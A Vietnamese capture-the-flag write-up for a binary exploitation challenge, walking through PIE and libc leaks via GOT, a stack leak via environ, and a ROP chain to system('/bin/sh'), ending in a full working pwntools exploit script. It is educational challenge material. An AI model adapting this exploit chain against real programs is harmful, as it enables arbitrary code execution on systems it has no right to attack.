# Interview---Write-up-----KCSC-Recruitment-2026

Hướng dẫn cách giải bài Interview của giải KCSC-Recruitment-2026

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 30/12/2025

## 1. Mục tiêu cần làm
Bài này là bài nâng cấp của bài trước. Thay vì có hàm win để chúng ta xài thì bài này cho chúng ta `libc.so.6`. Vậy chúng ta phải tận dụng nó thôi. Lỗi code vẫn y chang bài trước, nhưng lần này có 1 lỗi khác sẽ được áp dụng.

Các bạn có nhớ bài cũ chúng ta thấy 1 địa chỉ rất lạ nằm kế bên `leak PIE` không. Đó là con trỏ đó.

<img width="906" height="116" alt="image" src="https://github.com/user-attachments/assets/4aaefcf2-220a-43d7-a244-302e111935ae" />

`0x5555555592a0` chính là địa chỉ của thằng `present` mà chúng ta nhập ở lần 3. Và khi in thì nó sẽ trỏ vào `0x5555555592a0` rồi in ra nội dung ở địa chỉ này. Vậy sẽ ra sao nếu chúng ta thay nó bằng 1 thằng `got`.

## 2. Cách thực thi
Đàu tiên là leak PIE. Cách này mình đã chỉ ở bài cũ rồi, ai chưa coi thì quay lại coi đi.

```Python
request(0, b'Dummy1' + b'\n', b'Dummy2' + b'\n', b'\n')

edit_oob(0, b'Dummy1' + b'\n', b'A' * 30 + b'\n', b'\n', b'D' * 2)

see(0)

p.recvuntil(b'D' * 2)

leak_PIE = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"Leak PIE : {hex(leak_PIE)}")

offset = e.symbols['presents'] + 80
PIE_base = leak_PIE - offset
log.info(f"PIE base : {hex(PIE_base)}")
```

Giờ thì chúng ta sẽ ghi đè qua `leak PIE` để đổi vị trí con trỏ thành `got`. Chúng ta cần tìm thằng nào đã được thực thi rồi mới xài. Mình thấy đầu bài nó sử dụng `menu`, trong đây nó xài `puts`. Nên `puts` đã được khởi tạo và xài.

```C
int menu()
{
  puts("1. Request Present");
  puts("2. See Presents");
  puts("3. Edit Presents");
  puts("4. Call Santa to deliver presents");
  return printf(">> ");
}
```

Mình sẽ xài `puts@got` để `leak libc`. Các bạn có thể xài các thằng khác đều được.

Ở bài này nếu ta ghi đè `leak PIE` bằng 1 byte bất kì thì nó sẽ bị lỗi ngay vì hàm `check_handler`.

```C
char *check_handler()
{
  char *result; // rax
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 14; ++i )
  {
    result = (char *)qword_40A8[10 * i];
    if ( result )
    {
      result = (char *)&presents + 80 * i + 80;
      if ( (char *)(*((_QWORD *)&unk_40A0 + 10 * i) >> 8) != result )
      {
        puts("Present Corrupted! Satan is coming to you!");
        exit(1);
      }
    }
  }
  return result;
}
```

Vậy nên mình sẽ sử dụng lại thằng `leak PIE` đó nhét lại vô chỗ đó để vượt mặt `check_handler`.

```Python
put_got_add = PIE_base + e.got['puts']
log.info(f"Puts GOT : {hex(put_got_add)}")

integrity_value = (leak_PIE << 8) & 0xffffffffffffffff

payload = b'D' + p64(integrity_value) + p64(put_got_add)

edit_oob(0, b'Dummy1' + b'\n', b'A' * 30 + b'\n', b'\n', payload)

see(0)

p.recvuntil(b"Present: ")
raw_leak = p.recv(6) 
leaked_puts = u64(raw_leak.ljust(8, b"\x00"))
libc_base = leaked_puts - 0x87be0

log.success(f"Leak Libc : {hex(leaked_puts)}")
log.success(f"Offset : {hex(lib.symbols['puts'])}")
log.success(f"Libc base chuẩn: {hex(libc_base)}")
```

Con số `0x87be0` thì mình tìm trong gdb. Đầu tiên các bạn cần chạy bài này và `pause` lại lúc vừa in ra `leak libc`. Sau đó attach PID rồi gõ vmmap.

<img width="1138" height="123" alt="image" src="https://github.com/user-attachments/assets/6cbabe96-8c0c-4a6c-a18d-f1f87c0a1060" />

Giờ hãy lấy `leak libc` mà bạn đã in ra rồi trừ cho vị trí thấp nhất của `Libc` là `0x72009c800000` thì nó sẽ ra `0x87be0`.

Sau khi có đầy đủ tất cả thì chúng ta sẽ sử dụng 1 kĩ thuật `Leak Stack` ( tự bịa ). Kĩ thuật này sẽ xoay quanh biến `environ`. Vậy nó là gì ?
- **Vị trí** : Biến này nằm trong vùng dữ liệu (.data hoặc .bss) của `Libc`.
- **Giá trị** : Nó lưu trữ địa chỉ của mảng các biến môi trường ( environment variables ).
- **Vị trí của các biến môi trường** : Khi một chương trình khởi chạy, các biến môi trường luôn được hệ điều hành đặt ở đỉnh của Stack.

➡️ **Mấu chốt** : Vì environ nằm trong `Libc` nhưng lại trỏ vào `Stack`, nên nếu bạn đọc được giá trị của nó, bạn sẽ biết được `Stack` đang nằm ở đâu.

Khi biết `Stack` nằm đâu, chúng ta có thể tìm được địa chỉ của thằng `Saved RIP` và dùng kĩ thuật để `leak Libc` trỏ vào đó và đặt ROPchain. Khi thoát chương trình nó sẽ tự động thực thi ROPchain của mình.

```Python
environ_ptr = libc_base + 0x20ad58                         # tìm trong objdump
request(1, b'Dummy1' + b'\n', b'Dummy2' + b'\n', b'\n')

addr_p2 = PIE_base + e.symbols['presents'] + 160
integrity_v1 = (addr_p2 << 8) & 0xffffffffffffffff

payload_stack = b'D' + p64(integrity_v1) + p64(environ_ptr)
edit_oob(1, b'Dummy1' + b'\n', b'A' * 30 + b'\n', b'\n', payload_stack)

see(1)
p.recvuntil(b"Present: ")
stack_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.success(f"Stack leak (environ) : {hex(stack_leak)}")

target_rip_stack = stack_leak - 0x130 

log.info(f"Target RIP Stack: {hex(target_rip_stack)}")
```

Tại sao mình không xài index = 0 ? Vì con trỏ nó bị vấy bẩn rồi. Nếu xài sẽ bị gõ gậy ngay nên chúng ta nên xài index mới.

Giờ mình sẽ chỉ bạn cách tìm offset `0x130`. Sau khi leak được `stack`, hãy pause lại và vô gdb. Gõ `bt` ( back trace ) và tìm xem thằng main nằm ở đâu ( mục tiêu là saved RIP của main ).

<img width="592" height="297" alt="image" src="https://github.com/user-attachments/assets/0d2b55b5-e585-45ae-ab6f-8215f146b84a" />

Sau đó gõ `f 5` để truy cập vào đó và `info frame` để xem địa chỉ của `saved RIP`.

<img width="838" height="263" alt="image" src="https://github.com/user-attachments/assets/1dfd57f1-e6d4-4c3f-a4e9-7e00b144098d" />

`saved RIP` at `0x7ffc1189d878`. Giờ ta có `saved RIP` rồi, có được địa chỉ `stack` rồi. Lấy `stack` trừ `saved RIP` là ra.

<img width="531" height="73" alt="image" src="https://github.com/user-attachments/assets/9eb439f9-f83b-4ce8-aa13-af7b3f733dc6" />

Giờ tiếp theo là tạo 1 ROPchain và trỏ vào saved RIP.

```Python
pop_rdi = libc_base + 0x000000000010f78b
ret = libc_base + 0x000000000002882f
bin_sh = 0x1cb42f+ libc_base
system = 0x58750 + libc_base

chain = p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)

request(2, b'Final\n', b'Addr2\n', b'\n')
addr_p3 = PIE_base + e.symbols['presents'] + 240
integrity_v2 = (addr_p3 << 8) & 0xffffffffffffffff
payload_rip = b'D' + p64(integrity_v2) + p64(target_rip_stack)

edit_oob(2, b'A\n', b'A' * 30 + b'\n', b'\n', payload_rip)
```

Tất cả offset mình tìm từ **objdump** hết. Sau khi chúng ta thay đổi con trỏ của `present` trỏ vào `saved RIP` rồi thì chúng ta sẽ thực hiện bước cuối là ghi ROPchain vào địa chỉ đó.

```Python
p.sendlineafter(b'>> ', b'3')
p.sendlineafter(b'Id: ', b'2')
p.sendafter(b'name: ', b'A\n')
p.sendafter(b'address: ', b'A\n')

p.sendafter(b'present: ', chain + b'\n') 
p.sendlineafter(b'delivery? ', b'2')
```

Không cần edit lại `address` tránh bị hư con trỏ.

Sau khi ghi vào rồi thì thoát chương trình để nó thực thi `saved RIP` thôi.

```Python
p.sendlineafter(b'>> ', b'4')

p.interactive()
```

Vậy là xong, bài này khá là hay vì đây là lần đầu tiên mình gặp và sử dụng kĩ thuật này. Có thể sẽ gặp nhiều trong các bài tới. Thôi thì cũng gần qua năm mới rồi mình chúc các bạn an khang thịnh vượng, vạn sự như ý, phát tài phát lộc, 8386. Tiền vô như nước sông Đà, tiền ra nhỏ giọt như cà phê phin 🐧.

<img width="445" height="116" alt="image" src="https://github.com/user-attachments/assets/8bd09a56-b127-4c5e-927a-9d8cc263d91c" />

## 3. Exploit
```Python
from pwn import *

p = process('./chall')
e = ELF('./chall')
lib = ELF('./libc.so.6')

def request(idx, name, addr, present):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Id: ', str(idx).encode())
    p.sendafter(b'name: ', name)
    p.sendafter(b'address: ', addr)
    p.sendafter(b'present: ', present)

def see(idx):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Id: ', str(idx).encode())

def edit_oob(idx, name, addr, present, payload):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'Id: ', str(idx).encode())
    p.sendafter(b'name: ', name)
    p.sendafter(b'address: ', addr) 
    p.sendafter(b'present: ', present)
    p.sendlineafter(b'delivery? ', b'1')
    #pause()
    p.sendafter(b'address: ', payload)

request(0, b'Dummy1' + b'\n', b'Dummy2' + b'\n', b'\n')

edit_oob(0, b'Dummy1' + b'\n', b'A' * 30 + b'\n', b'\n', b'D' * 2)

see(0)

p.recvuntil(b'D' * 2)

leak_PIE = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"Leak PIE : {hex(leak_PIE)}")

offset = e.symbols['presents'] + 80
PIE_base = leak_PIE - offset
log.info(f"PIE base : {hex(PIE_base)}")

put_got_add = PIE_base + e.got['puts']
log.info(f"Puts GOT : {hex(put_got_add)}")

integrity_value = (leak_PIE << 8) & 0xffffffffffffffff

payload = b'D' + p64(integrity_value) + p64(put_got_add)

edit_oob(0, b'Dummy1' + b'\n', b'A' * 30 + b'\n', b'\n', payload)

see(0)

p.recvuntil(b"Present: ")
raw_leak = p.recv(6) 
leaked_puts = u64(raw_leak.ljust(8, b"\x00"))
libc_base = leaked_puts - 0x87be0

log.success(f"Leak Libc : {hex(leaked_puts)}")
log.success(f"Offset : {hex(lib.symbols['puts'])}")
log.success(f"Libc base chuẩn: {hex(libc_base)}")

environ_ptr = libc_base + 0x20ad58

request(1, b'Dummy1' + b'\n', b'Dummy2' + b'\n', b'\n')

addr_p2 = PIE_base + e.symbols['presents'] + 160
integrity_v1 = (addr_p2 << 8) & 0xffffffffffffffff

payload_stack = b'D' + p64(integrity_v1) + p64(environ_ptr)
edit_oob(1, b'Dummy1' + b'\n', b'A' * 30 + b'\n', b'\n', payload_stack)

see(1)
p.recvuntil(b"Present: ")
stack_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.success(f"Stack leak (environ) : {hex(stack_leak)}")

target_rip_stack = stack_leak - 0x130 

log.info(f"Target RIP Stack: {hex(target_rip_stack)}")

pop_rdi = libc_base + 0x000000000010f78b
ret = libc_base + 0x000000000002882f
bin_sh = 0x1cb42f+ libc_base
system = 0x58750 + libc_base

chain = p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)

request(2, b'Final\n', b'Addr2\n', b'\n')
addr_p3 = PIE_base + e.symbols['presents'] + 240
integrity_v2 = (addr_p3 << 8) & 0xffffffffffffffff
payload_rip = b'D' + p64(integrity_v2) + p64(target_rip_stack)

edit_oob(2, b'A\n', b'A' * 30 + b'\n', b'\n', payload_rip)

p.sendlineafter(b'>> ', b'3')
p.sendlineafter(b'Id: ', b'2')
p.sendafter(b'name: ', b'A\n')
p.sendafter(b'address: ', b'A\n')

p.sendafter(b'present: ', chain + b'\n') 
p.sendlineafter(b'delivery? ', b'2')

p.sendlineafter(b'>> ', b'4')

p.interactive()
```
